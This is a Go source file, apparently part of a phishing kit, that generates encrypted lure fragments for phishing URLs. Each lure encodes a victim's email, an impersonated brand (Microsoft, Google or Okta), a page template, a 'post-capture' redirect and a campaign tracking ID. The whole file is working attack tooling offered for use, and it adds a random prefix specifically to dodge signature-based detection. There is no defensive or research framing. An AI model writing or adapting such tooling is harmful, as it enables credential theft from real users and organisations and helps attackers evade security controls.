// payload-generator — produces AES-256-GCM encrypted lure fragments
// for the Azure Front Door phishing kit.
//
// Usage:
//   go run . --key <base64-key> --email victim@corp.com --brand microsoft --template m365-shared --redirect https://login.microsoftonline.com
//
// Output: base64url-encoded encrypted fragment (the part after # in the URL)

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"os"
	"time"
)

// LureConfig is the decrypted lure payload that the landing page renders.
type LureConfig struct {
	Version   string `json:"v"`
	Email     string `json:"e"` // victim identifier
	Brand     string `json:"b"` // "microsoft", "google", "okta"
	Template  string `json:"t"` // template variant
	Redirect  string `json:"r"` // post-capture redirect URL
	Campaign  string `json:"c"` // campaign tracking ID
	Timestamp int64  `json:"ts"`
}

func main() {
	keyB64 := flag.String("key", "", "Base64-encoded AES-256 key (32 bytes)")
	email := flag.String("email", "", "Victim email or identifier")
	brand := flag.String("brand", "microsoft", "Brand: microsoft|google|okta")
	tmpl := flag.String("template", "shared-doc", "Template variant")
	redirect := flag.String("redirect", "https://login.microsoftonline.com", "Post-capture redirect")
	campaign := flag.String("campaign", "", "Campaign ID for tracking")
	flag.Parse()

	if *keyB64 == "" {
		fmt.Fprintln(os.Stderr, "ERROR: --key is required (base64-encoded 32-byte AES key)")
		fmt.Fprintln(os.Stderr, "Generate one: go run keygen.go")
		os.Exit(1)
	}
	if *email == "" {
		fmt.Fprintln(os.Stderr, "ERROR: --email is required")
		os.Exit(1)
	}

	key, err := base64.StdEncoding.DecodeString(*keyB64)
	if err != nil || len(key) != 32 {
		fmt.Fprintf(os.Stderr, "ERROR: invalid key: must be base64-encoded 32 bytes (got %d bytes)\n", len(key))
		os.Exit(1)
	}

	lure := LureConfig{
		Version:   "1",
		Email:     *email,
		Brand:     *brand,
		Template:  *tmpl,
		Redirect:  *redirect,
		Campaign:  *campaign,
		Timestamp: time.Now().Unix(),
	}

	plaintext, err := json.Marshal(lure)
	if err != nil {
		fmt.Fprintf(os.Stderr, "ERROR: marshal lure: %v\n", err)
		os.Exit(1)
	}

	encrypted, err := encryptAESGCM(plaintext, key)
	if err != nil {
		fmt.Fprintf(os.Stderr, "ERROR: encrypt: %v\n", err)
		os.Exit(1)
	}

	// Prepend random 3-byte prefix — avoids the trivially signatured "bXY9" base64 prefix
	prefix := make([]byte, 3)
	if _, err := rand.Read(prefix); err != nil {
		fmt.Fprintf(os.Stderr, "ERROR: random prefix: %v\n", err)
		os.Exit(1)
	}
	full := append(prefix, encrypted...)

	// Output: base64url (no padding) — URL-safe fragment
	encoded := base64.URLEncoding.WithPadding(base64.NoPadding).EncodeToString(full)

	// Also output the full URL for convenience
	fragment := base64.URLEncoding.EncodeToString(full)

	fmt.Println("=== ENCRYPTED FRAGMENT ===")
	fmt.Println(encoded)
	fmt.Println()
	fmt.Println("=== FULL FRAGMENT (with padding) ===")
	fmt.Println(fragment)
	fmt.Println()
	fmt.Printf("=== LURE CONFIG (before encryption) ===\n")
	fmt.Printf("  Email:    %s\n", lure.Email)
	fmt.Printf("  Brand:    %s\n", lure.Brand)
	fmt.Printf("  Template: %s\n", lure.Template)
	fmt.Printf("  Redirect: %s\n", lure.Redirect)
	fmt.Printf("  Campaign: %s\n", lure.Campaign)
	fmt.Printf("  Payload:  %d bytes → %d bytes encrypted (AES-256-GCM)\n", len(plaintext), len(encrypted))
}

// encryptAESGCM encrypts plaintext with AES-256-GCM using a random nonce.
// Returns nonce + ciphertext + tag concatenated (12 + N + 16 bytes).
func encryptAESGCM(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("new cipher: %w", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("gcm: %w", err)
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("nonce: %w", err)
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}
